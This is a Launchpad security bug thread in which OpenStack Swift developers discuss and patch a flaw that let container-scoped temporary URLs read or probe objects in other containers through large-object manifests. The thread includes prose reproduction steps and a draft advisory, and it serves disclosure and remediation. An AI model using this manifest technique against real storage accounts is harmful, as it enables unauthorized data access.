> do we expect using the tempurl to PUT new data to be able to backup the existing object before the overwrite?

Good question. =)

I need to check if a container level temp URL will allow you to set headers on a container. I don't think it does. If that is the case, it might be ok to allow writes to the object versioned container as it would take an account owner or admin to set that header, and a user with that key would not be able to change it. So it might make sense for a account owner to set the object version header for a container they are going to issue a container level key for.

I think I would prefer removing it from the release if possible as I would not want to rush to a solution that we might regret later. But if that is not an option, then I think having container level temp URLs that make requests to other containers 4xx, that would be ok too. At least 4xx would address security concerns, and how to improve it for cross container large objects/object versioning could be addressed at a later time, possibly extending temp URL to allow it.

> what are the privileges required to set a container tempurl key?
As far as I know, you have to be swift\_owner or a sub user with admin privileges to set/read the container level keys.
> If we expect that container tempurl \*keys\* to be handed out to people that have a more restricted access than that - well that's probably different - object versioning would be the next most likely attack vector.
I personally think container level temp URLs are similar to a ACL on a container. If I were a user, I would assume that if I created a key for a container level temp URL, and gave it out to a user, that they would only have access to read/write to that container. Just as if I had added them to an ACL for a container.
> do we expect using the tempurl to PUT new data to be able to backup the existing object before the overwrite?
Good question. =)
I need to check if a container level temp URL will allow you to set headers on a container. I don't think it does. If that is the case, it might be ok to allow writes to the object versioned container as it would take an account owner or admin to set that header, and a user with that key would not be able to change it. So it might make sense for a account owner to set the object version header for a container they are going to issue a container level key for.
I think I would prefer removing it from the release if possible as I would not want to rush to a solution that we might regret later. But if that is not an option, then I think having container level temp URLs that make requests to other containers 4xx, that would be ok too. At least 4xx would address security concerns, and how to improve it for cross container large objects/object versioning could be addressed at a later time, possibly extending temp URL to allow it.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-04-28: |  |  | [#6](/swift/%2Bbug/1449212/comments/6) |
| --- | --- | --- | --- |

container tempurls don't let you set the headers on a container.

DLOs stored in a world-readable container don't work unless the target container also is readable (ie with .listings). Therefore you cannot use a public container to probe other containers.

Carrying that principle through, does that mean this issue needs to be resolved such that if a tempurl for reading a manifest references a different...what? container? A tempurl is for a specific object, so it's not like we can know if the intent is to prevent reading even objects in the same container. The reported issue isn't any different than current behavior with account-level tempurls: a GET tempurl is able to read the full contents of the referenced objects, in the case of \*LOs.

It seems reasonable to me that a tempurl to an object, even a \*LO, is able to return the full data for that object. The difference from the above example with public objects is that tempurls are temporary, limited tokens. Maybe that's not a reasonable assumption and we need to strictly limit all tempurl requests to \*only\* the specific object referenced. That would effectively kill tempurl+\*LO support, though.

The danger seems to be with the ability for a tempurl that allows PUT to probe the rest of the account for data. (PUTs allow HEADs, even if GETs aren't allowed). So maybe on solution is to simply prevent creating manifests via a tempurl, or at least via container tempurls.

Options:

1. Drop container tempurl feature in Kilo

2. Update docs to caution about tempurls that could be used to probe an account

3. Prevent container tempurls from creating \*LO objects (ie prevent them from leaving their container)

4. Prevent container tempurls from following \*LO objects on read

What do you think? Is it possible to find a solution and implement it in the next 18-24 hours for Kilo? Since it affects account tempurls too[1], maybe this is something that gets patched immediately after kilo (ie not a new issue, even though container-level tempurls are new).

[1] depending on your assumptions about the scope of account-level vs container-level tempurls

container tempurls don't let you set the headers on a container.
DLOs stored in a world-readable container don't work unless the target container also is readable (ie with .listings). Therefore you cannot use a public container to probe other containers.
Carrying that principle through, does that mean this issue needs to be resolved such that if a tempurl for reading a manifest references a different...what? container? A tempurl is for a specific object, so it's not like we can know if the intent is to prevent reading even objects in the same container. The reported issue isn't any different than current behavior with account-level tempurls: a GET tempurl is able to read the full contents of the referenced objects, in the case of \*LOs.
It seems reasonable to me that a tempurl to an object, even a \*LO, is able to return the full data for that object. The difference from the above example with public objects is that tempurls are temporary, limited tokens. Maybe that's not a reasonable assumption and we need to strictly limit all tempurl requests to \*only\* the specific object referenced. That would effectively kill tempurl+\*LO support, though.
The danger seems to be with the ability for a tempurl that allows PUT to probe the rest of the account for data. (PUTs allow HEADs, even if GETs aren't allowed). So maybe on solution is to simply prevent creating manifests via a tempurl, or at least via container tempurls.
Options:
1. Drop container tempurl feature in Kilo
2. Update docs to caution about tempurls that could be used to probe an account
3. Prevent container tempurls from creating \*LO objects (ie prevent them from leaving their container)
4. Prevent container tempurls from following \*LO objects on read
What do you think? Is it possible to find a solution and implement it in the next 18-24 hours for Kilo? Since it affects account tempurls too[1], maybe this is something that gets patched immediately after kilo (ie not a new issue, even though container-level tempurls are new).
[1] depending on your assumptions about the scope of account-level vs container-level tempurls

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Schwede (cschwede)](https://launchpad.net/~cschwede) wrote on 2015-04-28: |  |  | [#7](/swift/%2Bbug/1449212/comments/7) |
| --- | --- | --- | --- |

The following works for me:

- an account owner "test:tester" creates a container "secret" with some data in it

- the account owner creates another container "other" and sets a container temp url key on it and a r/w ACL for user test:tester3

Now user test:tester3 can create a DLO in container "other" and uses a tempurl to access the data in container "secret". Of course the object names need to be known in advance to access them.

I think this is not wanted. To me the best option seems to be to check if the used \*container\* temp url key is in the same container like the \*SLO. This wouldn't change existing behavior for account container keys.

The following works for me:
- an account owner "test:tester" creates a container "secret" with some data in it
- the account owner creates another container "other" and sets a container temp url key on it and a r/w ACL for user test:tester3
Now user test:tester3 can create a DLO in container "other" and uses a tempurl to access the data in container "secret". Of course the object names need to be known in advance to access them.
I think this is not wanted. To me the best option seems to be to check if the used \*container\* temp url key is in the same container like the \*SLO. This wouldn't change existing behavior for account container keys.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Schwede (cschwede)](https://launchpad.net/~cschwede) wrote on 2015-04-28: |  |  | [#8](/swift/%2Bbug/1449212/comments/8) |
| --- | --- | --- | --- |

* [tempurl\_fix.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4386391/%2Bfiles/tempurl_fix.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4386391)
  (5.6 KiB,
  text/plain)

I attached a possible patch for DLO requests including updated unittests.

Let me know if this approach looks feasible, I would continue with SLO then.

We should also check if versioned objects as well as COPY requests are affected too.

I attached a possible patch for DLO requests including updated unittests.
Let me know if this approach looks feasible, I would continue with SLO then.
We should also check if versioned objects as well as COPY requests are affected too.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Schwede (cschwede)](https://launchpad.net/~cschwede) wrote on 2015-04-28: |  |  | [#9](/swift/%2Bbug/1449212/comments/9) |
| --- | --- | --- | --- |

* [tempurl\_fix.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4386423/%2Bfiles/tempurl_fix.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4386423)
  (8.3 KiB,
  text/plain)

Updated patch, with some refactoring applied.

Updated patch, with some refactoring applied.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-04-28: |  |  | [#10](/swift/%2Bbug/1449212/comments/10) |
| --- | --- | --- | --- |

Note: you can't (currently) do this with SLOs since tempurl helpfully (yuck) strips off any query params other than temp\_url\_sig and temp\_url\_expires.

Note: you can't (currently) do this with SLOs since tempurl helpfully (yuck) strips off any query params other than temp\_url\_sig and temp\_url\_expires.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [David Goetz (david-goetz)](https://launchpad.net/~david-goetz) wrote on 2015-04-28: |  |  | [#11](/swift/%2Bbug/1449212/comments/11) |
| --- | --- | --- | --- |

I think the idea of restricting temp url requests from only hitting that single container is workable but is not a great solution. I think forcing every middleware that does sub requests to do:

if allowed\_container and container != allowed\_container:

+ return HTTPUnauthorized(request=req)

is asking for problems imo. We have to add this to DLOs, SLOs, versioning, etc. My problem with the container lvl tempurls is that it provides anonymous access to objects. This doesn't jive all that well with container ACLs that are completely based on who is making the call. I'd want a pretty good reason to change this model and I don't know if container level tempurls (while a neat idea) is worth it. I'd much rather pull it from the release and figure out a better way than forcing something in quickly and regretting it later.

I think the idea of restricting temp url requests from only hitting that single container is workable but is not a great solution. I think forcing every middleware that does sub requests to do:
if allowed\_container and container != allowed\_container:
+ return HTTPUnauthorized(request=req)
is asking for problems imo. We have to add this to DLOs, SLOs, versioning, etc. My problem with the container lvl tempurls is that it provides anonymous access to objects. This doesn't jive all that well with container ACLs that are completely based on who is making the call. I'd want a pretty good reason to change this model and I don't know if container level tempurls (while a neat idea) is worth it. I'd much rather pull it from the release and figure out a better way than forcing something in quickly and regretting it later.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Alistair Coles (alistair-coles)](https://launchpad.net/~alistair-coles) wrote on 2015-04-28: |  |  | [#12](/swift/%2Bbug/1449212/comments/12) |
| --- | --- | --- | --- |

I'm so far failing to see how the vulnerability is limited to container level tempurl. Seems like if I have a tempurl to PUT to /a/c/o then I can PUT a manifest that points to a target /a/c\_other/o\_other and then HEAD the target. From staring at code it seems to me that works regardless of who generated the tempurl and using which keys.

\*If\* that is case I then reverting the container level tempurl feature would only serve to reveal the vulnerability with account level tempurl, and not really fix anything. So I'd advocate no revert and working on a fix to the problem across account and container level.

If I'm wrong and this vulnerability only exists with container level urls then I'm inclined to agree that rushing into a quick fix for kilo might be a mistake vs reverting the change.

I'm so far failing to see how the vulnerability is limited to container level tempurl. Seems like if I have a tempurl to PUT to /a/c/o then I can PUT a manifest that points to a target /a/c\_other/o\_other and then HEAD the target. From staring at code it seems to me that works regardless of who generated the tempurl and using which keys.
\*If\* that is case I then reverting the container level tempurl feature would only serve to reveal the vulnerability with account level tempurl, and not really fix anything. So I'd advocate no revert and working on a fix to the problem across account and container level.
If I'm wrong and this vulnerability only exists with container level urls then I'm inclined to agree that rushing into a quick fix for kilo might be a mistake vs reverting the change.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Richard Hawkins (richard-hawkins)](https://launchpad.net/~richard-hawkins) wrote on 2015-04-28: |  |  | [#13](/swift/%2Bbug/1449212/comments/13) |
| --- | --- | --- | --- |

I think it is limited to container level as, if you have an account temp URL key, and you have a DLO/SLO, you could just generate a temp URL for each segment of the DLO/SLO and get the data that way.

With a container level temp URL, your container key would be no good to generate a temp URL for an object in a different container, unless that key was also set on that other container.

I think it is limited to container level as, if you have an account temp URL key, and you have a DLO/SLO, you could just generate a temp URL for each segment of the DLO/SLO and get the data that way.
With a container level temp URL, your container key would be no good to generate a temp URL for an object in a different container, unless that key was also set on that other container.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-04-28: |  |  | [#14](/swift/%2Bbug/1449212/comments/14) |
| --- | --- | --- | --- |

I think reverting the feature until we figure this out is a good way to go. If we have to cut a release tomorrow, I'd rather not wedge something in there, and I don't think we'll figure this out in time.

I think reverting the feature until we figure this out is a good way to go. If we have to cut a release tomorrow, I'd rather not wedge something in there, and I don't think we'll figure this out in time.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-04-28: |  |  | [#15](/swift/%2Bbug/1449212/comments/15) |
| --- | --- | --- | --- |

What about if we just make PUT tempurls not work for creating a \*LO manifest? Might break some people - but I don't really know for what use-case? We could even make it a "enable thing that's probably a bad idea" option with default of False?

What about if we just make PUT tempurls not work for creating a \*LO manifest? Might break some people - but I don't really know for what use-case? We could even make it a "enable thing that's probably a bad idea" option with default of False?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [paul luse (paul-e-luse)](https://launchpad.net/~paul-e-luse) wrote on 2015-04-28: |  |  | [#16](/swift/%2Bbug/1449212/comments/16) |
| --- | --- | --- | --- |

Reading through all of this, and not having gone through all of the relevant code yet, my 2 cents is worth, well whatever, but it seems like we ought to revert and, as Sam states, work on a more well thought out solution for a near term follow on release. Releasing Kilo with a quick-attempt-fix for a security issue doesn't feel right.

Reading through all of this, and not having gone through all of the relevant code yet, my 2 cents is worth, well whatever, but it seems like we ought to revert and, as Sam states, work on a more well thought out solution for a near term follow on release. Releasing Kilo with a quick-attempt-fix for a security issue doesn't feel right.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-04-28: |  |  | [#17](/swift/%2Bbug/1449212/comments/17) |
| --- | --- | --- | --- |

For what it's worth, if this is new in Kilo and the decision is to leave it in the release, then we may need to continue working out the fix in private and issue a security advisory once it's done. On the other hand if it's reverted now and punted to Liberty development then there's no need for further embargo or any advisory.

For what it's worth, if this is new in Kilo and the decision is to leave it in the release, then we may need to continue working out the fix in private and issue a security advisory once it's done. On the other hand if it's reverted now and punted to Liberty development then there's no need for further embargo or any advisory.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-04-28: |  |  | [#18](/swift/%2Bbug/1449212/comments/18) |
| --- | --- | --- | --- |

After further discussion (in IRC), this will be treated as any security issue and there will not be a revert or patch for kilo (swift 2.3.0) before the release.

This issue has a few interesting points:

1) tempurls which allow PUT also allow HEAD.

2) tempurls follow manifests to return the entire object, regardless of where the segments are or permissions on their container

3) because of 1 and 2, a user with a tempurl can create a DLO and then probe the rest of the account for other objects. This is true no matter the key used to generate the tempurl

4) container keys are meant to be shared with subusers so that the subuser can pass out container-scoped tempurls. The subuser would have an indentity (ie token) to access the container.

5) Because of 1, 2, and 4 subusers can probe for objects in the account. ie the tempurl crosses the container boundary.

The solution has a few points:

1) Prevent tempurl PUTs from writing DLOs (by returning an error if x-object-manifest header is on the request).

2) The tempurl should tract the scope of the signed url (ie account and container) so that it cannot cross boundaries. In other words, the subrequests generated eg to fetch DLO segments should be authorized according to the original tempurl (not with a blanket "allow" authorize() callback).

After further discussion (in IRC), this will be treated as any security issue and there will not be a revert or patch for kilo (swift 2.3.0) before the release.
This issue has a few interesting points:
1) tempurls which allow PUT also allow HEAD.
2) tempurls follow manifests to return the entire object, regardless of where the segments are or permissions on their container
3) because of 1 and 2, a user with a tempurl can create a DLO and then probe the rest of the account for other objects. This is true no matter the key used to generate the tempurl
4) container keys are meant to be shared with subusers so that the subuser can pass out container-scoped tempurls. The subuser would have an indentity (ie token) to access the container.
5) Because of 1, 2, and 4 subusers can probe for objects in the account. ie the tempurl crosses the container boundary.
The solution has a few points:
1) Prevent tempurl PUTs from writing DLOs (by returning an error if x-object-manifest header is on the request).
2) The tempurl should tract the scope of the signed url (ie account and container) so that it cannot cross boundaries. In other words, the subrequests generated eg to fetch DLO segments should be authorized according to the original tempurl (not with a blanket "allow" authorize() callback).

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Oliver (matt-0)](https://launchpad.net/~matt-0) wrote on 2015-04-29: |  |  | [#19](/swift/%2Bbug/1449212/comments/19) |
| --- | --- | --- | --- |

If your going to give out a PUT tempurl then your trusting someone to put stuff. But I guess there are different levels of \_trust\_.

I see that DLO's are an issue in this case, (someone could attempt to probe the account) and so if we go with blocking a PUT request from the tempurl middleware when X-Object-Manifiest headers exists will stop that. Noting we want a tempurl GET to support DLO as that is a valid use case.

If we are going to filter on X-Object-Manifest in tempurl PUT, do we need to think about x-versions-location as well (which I guess isn't a problem until someone has PUT and DELETE tempurls)... However, will this start making TempURL middleware more coupled with others? I guess if we can find a good way to limit the scope tempurl's have access to will solve this.

If your going to give out a PUT tempurl then your trusting someone to put stuff. But I guess there are different levels of \_trust\_.
I see that DLO's are an issue in this case, (someone could attempt to probe the account) and so if we go with blocking a PUT request from the tempurl middleware when X-Object-Manifiest headers exists will stop that. Noting we want a tempurl GET to support DLO as that is a valid use case.
If we are going to filter on X-Object-Manifest in tempurl PUT, do we need to think about x-versions-location as well (which I guess isn't a problem until someone has PUT and DELETE tempurls)... However, will this start making TempURL middleware more coupled with others? I guess if we can find a good way to limit the scope tempurl's have access to will solve this.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Richard Hawkins (richard-hawkins)](https://launchpad.net/~richard-hawkins) wrote on 2015-04-29: |  |  | [#20](/swift/%2Bbug/1449212/comments/20) |
| --- | --- | --- | --- |

There are different levels of trust, but I think what is at issue here is the account owner's expectation of what a user can do with a temp url he gives out. To me, the issue revolves around users being able to use these things to get information that is not obvious to the account owner. If it is obvious, then the feature might become useless as it is trivial to gain access to objects that you should not have access to or to probe for the existence of objects.

I don't see an issue with x-versions-location, as you can not set headers on a container with a temp url as far as I know. So it does not seem like it could be abused to either leak data or probe for object existence. Even if you have a PUT and DELETE temp url, and the container has the x-versions-location set, all you would be able to do is push and pop versions of the object you have access to into and out of the x-versions-location container. And that seems like it might be expected behavior by the account owner. (although there might be other ways to abuse it which I can't think of right now)

There are different levels of trust, but I think what is at issue here is the account owner's expectation of what a user can do with a temp url he gives out. To me, the issue revolves around users being able to use these things to get information that is not obvious to the account owner. If it is obvious, then the feature might become useless as it is trivial to gain access to objects that you should not have access to or to probe for the existence of objects.
I don't see an issue with x-versions-location, as you can not set headers on a container with a temp url as far as I know. So it does not seem like it could be abused to either leak data or probe for object existence. Even if you have a PUT and DELETE temp url, and the container has the x-versions-location set, all you would be able to do is push and pop versions of the object you have access to into and out of the x-versions-location container. And that seems like it might be expected behavior by the account owner. (although there might be other ways to abuse it which I can't think of right now)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Oliver (matt-0)](https://launchpad.net/~matt-0) wrote on 2015-04-29: |  |  | [#21](/swift/%2Bbug/1449212/comments/21) |
| --- | --- | --- | --- |

ahh, good call Richard. (X-Versions-Location).

ahh, good call Richard. (X-Versions-Location).

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-05-01: |  |  | [#22](/swift/%2Bbug/1449212/comments/22) |
| --- | --- | --- | --- |

* [container-tempurl-scoping.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4388691/%2Bfiles/container-tempurl-scoping.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4388691)
  (82.1 KiB,
  text/plain)

Here's a potential patch. It looks large, but it's mostly unit-test fallout.

It's the output of `git show` on a local branch of mine, so it's got a commit comment that goes into a fair amount of detail.

Here's a potential patch. It looks large, but it's mostly unit-test fallout.
It's the output of `git show` on a local branch of mine, so it's got a commit comment that goes into a fair amount of detail.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-05-01: |  |  | [#23](/swift/%2Bbug/1449212/comments/23) |
| --- | --- | --- | --- |

so I think the mostly unit-test fallout is going to be an issue for back-porting. The commit message is great, but it doesn't really go into detail about why moving the env cache to the subdir was required.

I think I understand now that in creating a copy of the subrequest before sending it down into the app the cached values weren't getting set on the req that originally came \*into\* the app - which caused some things to go south because of how crazy all that env caching get\_info stuff is. Probably should be fixed - but not 100% sure it needs to be part of this fix and backport? Honestly the whole copy trick seems like a lot of effort to go through to avoid the swift.authorize pop? Why can't we just do like what we do with cross-account-copy requests and just leave the authorize callback in place?

<https://gist.github.com/clayg/11e4e9c0c3f652d82e0f>

^ this mostly just steals sam's hardwork and tries to avoid the info cache change that caused all the test fallout.

Also I'm not 100% sure on the precedence of container and account tempurl keys? Maybe it was pre-existing but I don't think it had the same effect. Now if a tempurl matches the container key it'll get scoped - but if that key happens to collide with the account my cross container segment object downloads don't authorize - and there's nothing really to tell me whats going on? Would it be better to scope to the larger matching scope?

Also, I think we need functests to cover this issue.

Also, isn't there a separate issue with handing out a PUT tempurl that we need to address with stripping manifest headers - or did I miss where we decided that's a non-issue?

so I think the mostly unit-test fallout is going to be an issue for back-porting. The commit message is great, but it doesn't really go into detail about why moving the env cache to the subdir was required.
I think I understand now that in creating a copy of the subrequest before sending it down into the app the cached values weren't getting set on the req that originally came \*into\* the app - which caused some things to go south because of how crazy all that env caching get\_info stuff is. Probably should be fixed - but not 100% sure it needs to be part of this fix and backport? Honestly the whole copy trick seems like a lot of effort to go through to avoid the swift.authorize pop? Why can't we just do like what we do with cross-account-copy requests and just leave the authorize callback in place?
https://gist.github.com/clayg/11e4e9c0c3f652d82e0f
^ this mostly just steals sam's hardwork and tries to avoid the info cache change that caused all the test fallout.
Also I'm not 100% sure on the precedence of container and account tempurl keys? Maybe it was pre-existing but I don't think it had the same effect. Now if a tempurl matches the container key it'll get scoped - but if that key happens to collide with the account my cross container segment object downloads don't authorize - and there's nothing really to tell me whats going on? Would it be better to scope to the larger matching scope?
Also, I think we need functests to cover this issue.
Also, isn't there a separate issue with handing out a PUT tempurl that we need to address with stripping manifest headers - or did I miss where we decided that's a non-issue?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-05-04: |  |  | [#24](/swift/%2Bbug/1449212/comments/24) |
| --- | --- | --- | --- |

Going in no particular order:

If an account and container share a key, then the bigger scope should apply. That'll cause the minimum confusion. I'll fix it.

I will also put more words about the swift.infocache thing in the commit message.

I will attempt to write a functional test as well.

We don't need to strip anything on tempurl PUT. Now that the authorize callback isn't getting stepped on, you can't use a container tempurl to GET a manifest with segments in another container, so there's no problem letting the user make one.

I'd like to, someday, make all that get\_info stuff a little more sane. The fact that it relies on this key existing in the response's environment dictionary to get account or container info is pretty damn strange, and it causes all sorts of problems if you ever want to use a modified response without changing what the caller sent you. This fix makes it a little better in that you can shallow-copy the WSGI environment without breaking get\_info()'s caching and basic functionality. The real fix is probably to make get\_info() look at the response headers for account/container info instead of grubbing around in the response environment.

I'm not a fan of adding to the COPY-check for a couple reasons. First, swift.authorize\_override is really just an instruction to auth systems that says someone else is stepping in to handle auth so please don't fail this request. Overloading that in the proxy seems like a hack that works for tempurl, but only coincidentally. Second, since Thiago is working on moving COPY to middleware, we'll be able to get rid of that workaround for COPY too, and just always pop out swift.authorize if it has already authorized the request.

Besides, moving all that stuff to swift.infocache can help out the cacheability of stuff. Right now, if a middleware makes a subrequest and shallow-copies the environment to do so, any get\_\*\_info done on that subrequest doesn't get cached later since it only appears in the copied env. By moving all that stuff into swift.infocache, the get\_\*\_info calls will get their results cached.

Going in no particular order:
If an account and container share a key, then the bigger scope should apply. That'll cause the minimum confusion. I'll fix it.
I will also put more words about the swift.infocache thing in the commit message.
I will attempt to write a functional test as well.
We don't need to strip anything on tempurl PUT. Now that the authorize callback isn't getting stepped on, you can't use a container tempurl to GET a manifest with segments in another container, so there's no problem letting the user make one.
I'd like to, someday, make all that get\_info stuff a little more sane. The fact that it relies on this key existing in the response's environment dictionary to get account or container info is pretty damn strange, and it causes all sorts of problems if you ever want to use a modified response without changing what the caller sent you. This fix makes it a little better in that you can shallow-copy the WSGI environment without breaking get\_info()'s caching and basic functionality. The real fix is probably to make get\_info() look at the response headers for account/container info instead of grubbing around in the response environment.
I'm not a fan of adding to the COPY-check for a couple reasons. First, swift.authorize\_override is really just an instruction to auth systems that says someone else is stepping in to handle auth so please don't fail this request. Overloading that in the proxy seems like a hack that works for tempurl, but only coincidentally. Second, since Thiago is working on moving COPY to middleware, we'll be able to get rid of that workaround for COPY too, and just always pop out swift.authorize if it has already authorized the request.
Besides, moving all that stuff to swift.infocache can help out the cacheability of stuff. Right now, if a middleware makes a subrequest and shallow-copies the environment to do so, any get\_\*\_info done on that subrequest doesn't get cached later since it only appears in the copied env. By moving all that stuff into swift.infocache, the get\_\*\_info calls will get their results cached.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-05-04: |  |  | [#25](/swift/%2Bbug/1449212/comments/25) |
| --- | --- | --- | --- |

* [tempurl-torgomatic-patch2.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4390909/%2Bfiles/tempurl-torgomatic-patch2.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4390909)
  (86.4 KiB,
  text/plain)

This one includes a better explanation in the commit comment, a pair of functional tests for DLO + container tempurl, and a test that account-scope beats container-scope when they share a key (turns out that was already the case, but still good to test for).

This one includes a better explanation in the commit comment, a pair of functional tests for DLO + container tempurl, and a test that account-scope beats container-scope when they share a key (turns out that was already the case, but still good to test for).

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-05-05: |  |  | [#26](/swift/%2Bbug/1449212/comments/26) |
| --- | --- | --- | --- |

Here's a first take at an impact description for this. I've almost certainly got some of the details and terminology wrong, so please correct me. It looks from the latest updates like any potential to exploit account tempurls in a similar fashion has been discounted, and so this is a kilo (2.3.0) only vulnerability since container tempurls were implemented after Juno/2.2.0 (and also after the 2.2.2 interim release)...

Title: Information leak via Swift container tempurls

Reporter: Richard Hawkins from Rackspace

Products: Swift

Affects: 2.3.0

Description:

Richard Hawkins from Rackspace reported a vulnerability in Swift container-scoped tempurls. When in possession of a tempurl generated using a key on a Swift container, a malicious actor may retrieve objects within any other container for the same tenant environment.

Here's a first take at an impact description for this. I've almost certainly got some of the details and terminology wrong, so please correct me. It looks from the latest updates like any potential to exploit account tempurls in a similar fashion has been discounted, and so this is a kilo (2.3.0) only vulnerability since container tempurls were implemented after Juno/2.2.0 (and also after the 2.2.2 interim release)...
Title: Information leak via Swift container tempurls
Reporter: Richard Hawkins from Rackspace
Products: Swift
Affects: 2.3.0
Description:
Richard Hawkins from Rackspace reported a vulnerability in Swift container-scoped tempurls. When in possession of a tempurl generated using a key on a Swift container, a malicious actor may retrieve objects within any other container for the same tenant environment.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Richard Hawkins (richard-hawkins)](https://launchpad.net/~richard-hawkins) wrote on 2015-05-05: |  |  | [#27](/swift/%2Bbug/1449212/comments/27) |
| --- | --- | --- | --- |

Hi Jeremy,

I think in addition, the discussions that resulted in me reporting this bug exposed a second vulnerability with account level temp URLs that has been around for a while.

Where someone with a account level PUT temp URL could potentially probe for existing objects by created DLO that references other containers/objects and HEADING the DLO created. If they had a pair of account level PUT/GET temp URLs, could additionally retrieve data from any object found.

I am not sure who first figured it out, but Sam Merritt was I think the first person to explain it such that I understood this aspect of it.

Hi Jeremy,
I think in addition, the discussions that resulted in me reporting this bug exposed a second vulnerability with account level temp URLs that has been around for a while.
Where someone with a account level PUT temp URL could potentially probe for existing objects by created DLO that references other containers/objects and HEADING the DLO created. If they had a pair of account level PUT/GET temp URLs, could additionally retrieve data from any object found.
I am not sure who first figured it out, but Sam Merritt was I think the first person to explain it such that I understood this aspect of it.

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2015-05-05

| Changed in ossa: | |
| --- | --- |
| **status**: | Incomplete → Confirmed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-05-05: |  |  | [#28](/swift/%2Bbug/1449212/comments/28) |
| --- | --- | --- | --- |

Richard: Thanks. I guess I'm just confused where Samuel's commit message says "A similar bug would exist for manifests referencing other accounts except that neither the X-Object-Manifest (DLO) nor the JSON manifest document (SLO) have a way of specifying a different account." I took this to mean that only container tempurls are at issue and account tempurls are not, but it may be that my shallow understanding of the topic is biting me here.

If account tempurls are in fact also a problem, as previously discussed, then this sounds like it also affects versions through 1.13.1 (Icehouse), and 2.0.0 through 2.2.0 (Juno), as well as 2.2.1 through 2.3.0 (Kilo). If so, I think the impact description would look more like...

Title: Information leak via Swift tempurls

Reporter: Richard Hawkins from Rackspace

Products: Swift

Affects: versions through 1.13.1, 2.0.0 through 2.2.0, 2.2.1 through 2.3.0

Description:

Richard Hawkins from Rackspace reported a vulnerability in Swift tempurls. When in possession of a tempurl generated using a key on a Swift container or account, a malicious actor may retrieve objects within any other container for the same tenant environment.

Richard: Thanks. I guess I'm just confused where Samuel's commit message says "A similar bug would exist for manifests referencing other accounts except that neither the X-Object-Manifest (DLO) nor the JSON manifest document (SLO) have a way of specifying a different account." I took this to mean that only container tempurls are at issue and account tempurls are not, but it may be that my shallow understanding of the topic is biting me here.
If account tempurls are in fact also a problem, as previously discussed, then this sounds like it also affects versions through 1.13.1 (Icehouse), and 2.0.0 through 2.2.0 (Juno), as well as 2.2.1 through 2.3.0 (Kilo). If so, I think the impact description would look more like...
Title: Information leak via Swift tempurls
Reporter: Richard Hawkins from Rackspace
Products: Swift
Affects: versions through 1.13.1, 2.0.0 through 2.2.0, 2.2.1 through 2.3.0
Description:
Richard Hawkins from Rackspace reported a vulnerability in Swift tempurls. When in possession of a tempurl generated using a key on a Swift container or account, a malicious actor may retrieve objects within any other container for the same tenant environment.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-05-05: |  |  | [#29](/swift/%2Bbug/1449212/comments/29) |
| --- | --- | --- | --- |

Jeremy: you are correct; container tempurls have a problem, but account-level do not.

Jeremy: you are correct; container tempurls have a problem, but account-level do not.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-05-05: |  |  | [#30](/swift/%2Bbug/1449212/comments/30) |
| --- | --- | --- | --- |

